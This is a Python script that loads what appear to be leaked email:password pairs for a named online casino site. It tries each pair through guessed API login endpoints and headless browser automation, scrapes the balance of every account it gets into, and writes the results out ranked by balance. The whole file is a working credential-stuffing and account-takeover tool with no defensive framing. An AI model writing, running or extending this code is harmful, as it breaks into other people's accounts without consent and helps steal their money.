#!/usr/bin/env python3
import csv
import logging
import re
import sys
import time
from datetime import datetime

import requests
from bs4 import BeautifulSoup

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger()
URL = "https://cdk.goatspins.com:3072/lobby/"


def load_accounts(filepath):
    accounts = []
    seen = set()
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or re.match(r'^\d+\s*$', line):
                continue
            line = re.sub(r'^\d+\s*\|\s*', '', line)
            if not line:
                continue
            m = re.search(r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):(.+)', line)
            if m:
                email, pwd = m.group(1).strip(), m.group(2).strip().rstrip(' :')
                if pwd and '*none*' not in line.lower():
                    key = (email, pwd)
                    if key not in seen:
                        seen.add(key)
                        accounts.append({'email': email, 'password': pwd})
    return accounts


def extract_balance(html):
    soup = BeautifulSoup(html, 'html.parser')
    for sel in ['balance', '.balance', '#balance', '.wallet-balance', '.account-balance', '.total-balance']:
        for el in soup.select(sel):
            txt = el.get_text(' ', strip=True)
            m = re.search(r'[\$��]\s*[\d,]+\.?\d*', txt) or re.search(r'\d+,\d{3}\.\d{2}', txt)
            if m:
                return m.group(0)
    for kw in ['balance', 'cash', 'wallet', 'available']:
        for el in soup.find_all(string=re.compile(kw, re.I)):
            parent = el.parent
            if parent:
                txt = parent.get_text(' ', strip=True)
                m = re.search(r'[\$��]?\s*[\d,]+\.?\d*', txt)
                if m:
                    return m.group(0)
    return None


def try_api_login(session, email, password):
    login_urls = [URL + u for u in ['api/account/login', 'api/auth/login', 'account/login', 'lobby/api/login']]
    payloads = [{'username': email, 'password': password}, {'Email': email, 'Password': password}, {'UserName': email, 'Password': password}]
    for u in login_urls:
        for p in payloads:
            try:
                r = session.post(u, json=p, timeout=15, allow_redirects=False)
                if r.status_code == 200:
                    bt = (r.text or '').lower()
                    if any(s in bt for s in ['token', 'success', 'authenticated']):
                        bal = try_api_balance(session)
                        if bal:
                            return bal
            except Exception:
                continue
    return None


def try_api_balance(session):
    for u in [URL + x for x in ['api/account/balance', 'api/wallet', 'account/balance']]:
        try:
            r = session.get(u, timeout=15)
            if r.status_code == 200:
                b = extract_balance(r.text)
                if b:
                    return b
        except Exception:
            continue
    return None


def try_browser(email, password):
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from webdriver_manager.chrome import ChromeDriverManager
    except ImportError:
        return {'email': email, 'status': 'NO_BROWSER', 'error': 'pip install selenium webdriver-manager', 'balance': None}

    driver = None
    try:
        opts = Options()
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--window-size=1920,1080')

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        driver.set_page_load_timeout(30)
        driver.get(URL)

        # Wait for Vue.js to fully render (longer wait)
        WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
        WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
        time.sleep(10)  # Give Vue/JS time to fully initialize

        # Check if we can find any balance text in the body
        body_text = driver.find_element(By.TAG_NAME, 'body').text
        print(f'  Body text: {body_text[:100]}')

        # Try to find balance in page source
        b = extract_balance(driver.page_source)

        if b:
            return {'email': email, 'status': 'success', 'balance': b}

        # Try to find login form inputs (now the form might be visible)
        email_selectors = [
            'input[type="email"]', 'input[name="email"]', 'input[name="username"]', 'input[type="text"]'
        ]
        password_selectors = [
            'input[type="password"]'
        ]
        submit_selectors = [
            'button[type="submit"]', 'input[type="submit"]',
            'button.login', 'input.login',
            'button[class*="submit"]', 'button[class*="signin"]'
        ]

        email_filled = False
        for sel in email_selectors:
            try:
                elem = driver.find_element(By.CSS_SELECTOR, sel)
                if elem.is_displayed():
                    elem.clear()
                    elem.send_keys(email)
                    email_filled = True
                    break
            except Exception:
                continue

        password_filled = False
        for sel in password_selectors:
            try:
                elem = driver.find_element(By.CSS_SELECTOR, sel)
                if elem.is_displayed():
                    elem.clear()
                    elem.send_keys(password)
                    password_filled = True
                    break
            except Exception:
                continue

        if not email_filled or not password_filled:
            # Save page source for debugging
            debug_html = driver.page_source[:5000]
            return {'email': email, 'status': 'NO_FORM', 'error': 'Login form not found', 'debug': debug_html}

        # Try to submit
        submitted = False
        for sel in submit_selectors:
            try:
                elem = driver.find_element(By.CSS_SELECTOR, sel)
                if elem.is_displayed():
                    elem.click()
                    submitted = True
                    break
            except Exception:
                continue

        if not submitted:
            # Try pressing Enter on password field
            try:
                driver.find_element(By.CSS_SELECTOR, 'input[type="password"]').send_keys(u'\ue007')
                submitted = True
            except Exception:
                pass

        # Wait for page to load after login
        time.sleep(5)

        b = extract_balance(driver.page_source)

        if b:
            return {'email': email, 'status': 'success', 'balance': b}
        return {'email': email, 'status': 'ok', 'balance': None, 'error': 'No balance found'}

    except ImportError:
        return {'email': email, 'status': 'NO_BROWSER', 'error': 'pip install selenium webdriver-manager', 'balance': None}
    except Exception as e:
        return {'email': email, 'status': 'ERROR', 'error': str(e)[:200]}
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass


# ============================================================================
# Process accounts one by one  
# ============================================================================

def process_one(account, session):
    """Process a single account and display result immediately."""
    e = account['email']
    p = account['password']
    print()
    print('-' * 50)
    print(f"Checking: {e}")
    print('-' * 50)

    # Try API login first (fast but likely fails on JS SPA)
    b = try_api_login(session, e, p)
    if b:
        print(f"  Balance via API: {b}")
        print(f"  Result: SUCCESS")
        return {'email': e, 'balance': b, 'status': 'success'}

    # Fall back to browser automation
    res = try_browser(e, p)
    st = res.get('status', 'unknown')
    if st == 'success':
        bval = res.get('balance')
        print(f"  Balance (browser): {bval}")
        print(f"  Result: SUCCESS")
        return res
    elif st == 'NO_BROWSER':
        print(f"  {res.get('error', '')}")
        print(f"  Result: NO_BROWSER")
    else:
        err = res.get('error', '')[:60]
        print(f"  Error: {err}")
        print(f"  Result: FAILED")
    return res


# ============================================================================
# Save results
# ============================================================================

def save_results(results, output_format):
    """Save results to JSON or CSV, sorted by balance from highest to lowest."""
    import os
    import json

    # Sort results by balance (highest to lowest)
    def balance_sort_key(r):
        bal = r.get('balance', '') or ''
        if bal is None:
            return 0
        # Extract numeric value for sorting
        bal_str = str(bal).replace('$', '').replace('£', '').replace('€', '').replace(',', '')
        try:
            return float(bal_str)
        except (ValueError, TypeError):
            # If not a number, try to extract digits
            import re
            nums = re.findall(r'[\d.]+', bal_str)
            if nums:
                return float(nums[0])
            return -1  # Failed accounts at bottom

    results_sorted = sorted(results, key=balance_sort_key, reverse=True)

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    outdir = os.path.dirname(os.path.abspath(__file__))
    ext = '.json' if output_format == 'json' else '.csv'
    outpath = os.path.join(outdir, f'goatspins_balances_{ts}{ext}')

    if output_format == 'json':
        with open(outpath, 'w', encoding='utf-8') as f:
            json.dump(results_sorted, f, indent=2)
    else:
        with open(outpath, 'w', newline='', encoding='utf-8') as f:
            w = csv.DictWriter(f, fieldnames=['email', 'status', 'balance', 'error'])
            w.writeheader()
            for r in results_sorted:
                w.writerow({k: r.get(k, '') for k in w.fieldnames})

    print(f"Results saved to: {outpath}")
    return outpath


# ============================================================================
# Main entry point
# ============================================================================

def main():
    cred_file = sys.argv[1] if len(sys.argv) > 1 else 'goatspins.com_548.txt'
    output_format = sys.argv[2] if len(sys.argv) > 2 else 'csv'

    print(f"Loading accounts from: {cred_file}")
    accounts = load_accounts(cred_file)

    if not accounts:
        print("No accounts found!")
        sys.exit(1)

    print(f"Found {len(accounts)} accounts. Checking one by one...\n")

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })

    results = []
    for i, acct in enumerate(accounts, 1):
        print(f"\n[{i}/{len(accounts)}]")
        r = process_one(acct, session)
        results.append(r)
        if i < len(accounts):
            time.sleep(1.5)

    # Print summary
    succ = sum(1 for r in results if r.get('status') == 'success')
    fai = sum(1 for r in results if r.get('status') != 'success')
    print(f"\n{'=' * 50}")
    print(f"DONE - Total: {len(results)} | Success: {succ} | Failed: {fai}")
    print(f"{'=' * 50}")

    save_results(results, output_format)
    print("Processing complete.")


if __name__ == '__main__':
    main()
